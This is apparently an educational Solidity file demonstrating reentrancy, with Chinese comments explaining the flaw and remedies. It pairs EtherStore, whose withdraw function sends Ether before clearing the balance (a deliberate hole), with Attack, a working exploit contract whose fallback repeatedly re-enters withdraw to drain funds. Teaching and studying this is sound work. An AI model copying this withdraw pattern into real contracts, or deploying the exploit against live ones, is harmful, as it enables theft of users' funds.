// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract EtherStore {
    mapping(address => uint) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);

        // call 方法会有重入攻击风险，因为 call 可以消息不限量的 gas, 以至于攻击者可以用来执行合约
        // 攻击者可以在 fallback 里再次调用  withdraw , 因为通过合约调用 withdraw 这里的 msg.sender 最终是合约的地址，所以 bal 一直会大于 0
        // fallback 以下情况被调用 (0.6 之后 fallback 被分为 fallback 和 receive 方法)
        // 1.不存在的函数被调用
        // 2. Ether 直接发送到合约但 receive() 不存在或 msg.data 不为空 
        // 这里可以改用 transfer 或 send 方法， 或者使用加锁来防止重入攻击。
        // 因为 fallback 由 transfer 和 send 方法调用时会有 2300 gasLimit, 不足够用来执行一个合约。
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

contract Attack {
    address owner;
    EtherStore public etherStore;

    constructor(address _etherStoreAddress) {
        owner = msg.sender;
        etherStore = EtherStore(_etherStoreAddress);
    }

    modifier onlyOwner {
        require(msg.sender == owner);
        _;
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            etherStore.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        etherStore.deposit{value: 1 ether}();
        etherStore.withdraw();
    }

    // Helper function to check the balance of this contract
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }

    function withDrawEarning() public onlyOwner returns (uint256){
        uint256 balance = address(this).balance;
        (bool sent, ) = msg.sender.call{value: balance}("");
        require(sent, "Failed to send Ether");
        return balance;
    }
}
